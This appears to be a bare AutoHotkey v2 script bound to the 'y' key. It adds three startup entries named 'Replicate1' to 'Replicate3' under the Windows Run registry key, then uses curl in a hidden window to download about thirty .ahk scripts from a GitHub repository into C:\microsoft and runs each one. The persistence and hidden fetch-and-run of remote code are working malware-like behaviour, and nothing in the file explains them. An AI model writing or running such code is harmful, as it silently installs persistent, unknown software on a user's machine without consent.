#SingleInstance Ignore

^Esc::ExitApp

DirList(pattern, attr := "") {
    files := []
    Loop Files pattern, attr {
        files.Push(A_LoopFileFullPath)
    }
    return files
}

$y::{
    path := "C:\microsoft"
    Send "yy"
    RegWrite '"C:\microsoft\LButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate1"
    RegWrite '"C:\microsoft\RButton.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate2"
    RegWrite '"C:\microsoft\Delete.exe"', "REG_SZ", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Replicate3"
    if (DirExist(path)) {
        for file in DirList(path "\*") {
            Run file
        }
    } else {
        DirCreate(path)
        letters := ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "LButton", "RButton", "Delete", "Backspace", "Space"]
        for letter in letters {
            command := "cmd /c curl https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/" letter ".ahk > " path "\" letter ".ahk"
            RunWait command, , "Hide"
            Run path "\" letter ".ahk"
        }
    }
}
